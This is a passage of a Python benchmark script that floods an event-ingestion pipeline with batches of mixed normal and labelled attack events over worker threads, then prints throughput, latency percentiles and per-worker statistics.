        wcount = per_worker + (1 if i < remainder else 0)
        t = threading.Thread(target=worker_fn,
                             args=(i, args.host, args.port, wcount, batch_size,
                                   payloads, counters, stop_event),
                             daemon=True)
        threads.append(t)

    t_start = time.monotonic()
    for t in threads:
        t.start()
    print(f"  {num_workers} workers launched.\n")

    prev_sent = 0
    prev_time = t_start
    try:
        while any(t.is_alive() for t in threads):
            time.sleep(2.0)
            sent, errors, bytes_sent = counters.snapshot()
            now = time.monotonic()
            elapsed = now - t_start
            avg_eps = sent / elapsed if elapsed > 0 else 0
            # Interval EPS (last 2s window)
            interval_sent = sent - prev_sent
            interval_dt = now - prev_time
            interval_eps = interval_sent / interval_dt if interval_dt > 0 else 0
            counters.record_interval_eps(interval_eps)
            prev_sent = sent
            prev_time = now
            pct = sent / total * 100 if total > 0 else 100
            mbps = bytes_sent / (1024 * 1024) / elapsed if elapsed > 0 else 0
            n_est = int(sent * normal_ratio)
            a_est = sent - n_est
            print(f"  [{pct:5.1f}%] {sent:>10,}/{total:,}  avg {avg_eps:,.0f} EPS  cur {interval_eps:,.0f} EPS  "
                  f"{mbps:.1f} MB/s  err={errors}")
            if sent >= total:
                break
    except KeyboardInterrupt:
        print("\n  Interrupted! Stopping workers...")
        stop_event.set()

    for t in threads:
        t.join(timeout=5)

    for t in threads:
        t.join(timeout=5)

    stats = counters.get_full_stats()
    sent = stats["sent"]
    errors = stats["errors"]
    bytes_sent = stats["bytes_sent"]
    elapsed = time.monotonic() - t_start
    avg_eps = sent / elapsed if elapsed > 0 else 0
    n_est = int(sent * normal_ratio)
    a_est = sent - n_est

    # ── Latency percentiles ──────────────────────────────────────────
    latencies = stats["batch_latencies"]
    if latencies:
        latencies_sorted = sorted(latencies)
        p50 = latencies_sorted[int(len(latencies_sorted) * 0.50)]
        p95 = latencies_sorted[int(len(latencies_sorted) * 0.95)]
        p99 = latencies_sorted[min(int(len(latencies_sorted) * 0.99), len(latencies_sorted) - 1)]
        lat_min = latencies_sorted[0]
        lat_max = latencies_sorted[-1]
        lat_avg = statistics.mean(latencies)
    else:
        p50 = p95 = p99 = lat_min = lat_max = lat_avg = 0.0

    # ── EPS stats (from interval samples) ────────────────────────────
    interval_eps_list = stats["interval_eps"]
    if interval_eps_list:
        peak_eps = max(interval_eps_list)
        min_eps = min(interval_eps_list)
        eps_stddev = statistics.stdev(interval_eps_list) if len(interval_eps_list) > 1 else 0
    else:
        peak_eps = min_eps = avg_eps
        eps_stddev = 0

    # ── Connection stats ─────────────────────────────────────────────
    conn_times = stats["connect_times"]
    avg_conn = statistics.mean(conn_times) if conn_times else 0
    max_conn = max(conn_times) if conn_times else 0

    # ── Ramp-up time ─────────────────────────────────────────────────
    ramp_up = (stats["first_send_ts"] - t_start) if stats["first_send_ts"] else 0

    # ── Throughput ───────────────────────────────────────────────────
    total_mb = bytes_sent / (1024 * 1024)
    mbps = total_mb / elapsed if elapsed > 0 else 0
    avg_event_bytes = bytes_sent / sent if sent > 0 else 0

    print(f"\n{'═' * 70}")
    print(f"  CLIF BENCHMARK RESULTS")
    print(f"{'═' * 70}")
    print(f"")
    print(f"  ── Send Summary ────────────────────────────────────────────")
    print(f"  Events sent:       {sent:>12,} / {total:,}")
    print(f"  Normal events:     {n_est:>12,}  ({normal_ratio * 100:.1f}%)")
    print(f"  Attack events:     {a_est:>12,}  ({(1 - normal_ratio) * 100:.1f}%)")
    print(f"  Send errors:       {errors:>12,}")
    print(f"")
    print(f"  ── Throughput ──────────────────────────────────────────────")
    print(f"  Elapsed time:      {elapsed:>12.2f} s")
    print(f"  Avg EPS:           {avg_eps:>12,.0f}")
    print(f"  Peak EPS:          {peak_eps:>12,.0f}")
    print(f"  Min EPS:           {min_eps:>12,.0f}")
    print(f"  EPS Std Dev:       {eps_stddev:>12,.0f}")
    print(f"  Data sent:         {total_mb:>12.1f} MB")
    print(f"  Throughput:        {mbps:>12.1f} MB/s")
    print(f"  Avg event size:    {avg_event_bytes:>12.0f} bytes")
    print(f"")
    print(f"  ── Batch Latency (sendall) ─────────────────────────────────")
    print(f"  Batches sent:      {len(latencies):>12,}")
    print(f"  P50 latency:       {p50:>12.1f} ms")
    print(f"  P95 latency:       {p95:>12.1f} ms")
    print(f"  P99 latency:       {p99:>12.1f} ms")
    print(f"  Min latency:       {lat_min:>12.1f} ms")
    print(f"  Max latency:       {lat_max:>12.1f} ms")
    print(f"  Avg latency:       {lat_avg:>12.1f} ms")
    print(f"")
    print(f"  ── Connection ──────────────────────────────────────────────")
    print(f"  Workers:           {num_workers:>12}")
    print(f"  Avg connect time:  {avg_conn:>12.1f} ms")
    print(f"  Max connect time:  {max_conn:>12.1f} ms")
    print(f"  Ramp-up time:      {ramp_up * 1000:>12.1f} ms")
    print(f"")
    print(f"  ── Per-Worker Breakdown ────────────────────────────────────")
    for wid in sorted(stats["worker_stats"].keys()):
        ws = stats["worker_stats"][wid]
        w_mb = ws["bytes"] / (1024 * 1024)
        print(f"  Worker {wid:>2}: {ws['sent']:>10,} events  {w_mb:>7.1f} MB  {ws['errors']} errors")
    print(f"")
    print(f"{'═' * 70}")
    print(f"  Wait ~60s for pipeline processing, then query ClickHouse.")
    print(f"{'═' * 70}\n")

    return 0


if __name__ == "__main__":
    exit(main())
